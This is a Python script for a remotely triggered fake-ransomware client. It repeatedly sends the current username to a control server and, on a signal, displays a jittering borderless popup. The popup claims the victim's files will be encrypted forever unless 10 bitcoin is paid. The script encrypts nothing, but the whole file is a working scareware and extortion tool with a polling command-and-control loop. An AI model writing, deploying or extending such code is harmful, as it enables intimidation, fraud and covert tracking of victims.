import requests
import time
import threading
import tkinter as tk
from tkinter import *
from PIL import ImageTk, Image, ImageSequence
from random import randint
import getpass

CHECK_TRIGGERED_STATUS_URL = 'http://localhost/languages/python/clientHook/trigger.php'

def get_current_user():
    return getpass.getuser()

def check_triggered_status(current_user):
    try:
        response = requests.post(CHECK_TRIGGERED_STATUS_URL, data={'current_user': current_user})
        if response.status_code == 200:
            return response.json().get('status')
        else:
            print("Failed to retrieve data from API")
            return None
    except Exception as e:
        print(f"Error during API request: {e}")
        return None

def check_for_signal():
    while True:
        current_user = get_current_user()
        trigger_status = check_triggered_status(current_user)
        if trigger_status == 1:
            show_popup()
        else:
            print("Not yet detected...")
        time.sleep(5)

def show_popup():
    root = tk.Tk()
    root.overrideredirect(True)
    root.title("ALERT!")

    def move_window():
        root.geometry(f"950x500+{randint(10, 100)}+{randint(10, 100)}")
        root.after(10, move_window)

    image_pic = Image.open("C:\\wamp64\\www\\languages\\python\\clientHook\\dist\\hack.gif")
    frames = [ImageTk.PhotoImage(img) for img in ImageSequence.Iterator(image_pic)]
    label = tk.Label(root)
    label.pack(padx=0, pady=0, fill='both', expand=True)

    def animate(index):
        frame = frames[index]
        label.configure(image=frame)
        root.after(100, animate, (index + 1) % len(frames))

    root.after(0, animate, 0)
    text_label = tk.Label(root, text="YOU HAVE BEEN HACKED! YOUR FILES WILL BE ENCRYPTED FOREVER OR GIVE ME 10 BITCOIN!", font=("Helvetica", 15))
    text_label.pack(padx=0, pady=0, fill='both', expand=True)

    button = tk.Button(root, text="OK", command=root.destroy)
    button.pack(padx=0, pady=0, fill='both', expand=True)

    root.after(10000, lambda: root.destroy())
    move_window()
    root.mainloop()

if __name__ == '__main__':
    threading.Thread(target=check_for_signal, daemon=True).start()

    while True:
        time.sleep(1)